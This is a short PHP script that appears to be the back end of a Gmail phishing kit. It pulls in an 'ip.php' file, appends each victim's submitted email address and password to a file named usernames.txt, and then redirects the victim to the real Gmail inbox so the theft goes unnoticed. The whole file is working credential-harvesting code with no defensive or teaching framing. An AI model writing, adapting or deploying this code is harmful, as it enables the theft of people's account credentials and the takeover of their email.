<?php
include 'ip.php';

file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['email'] . " [PASS]: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://mail.google.com/mail/u/0/');
exit();
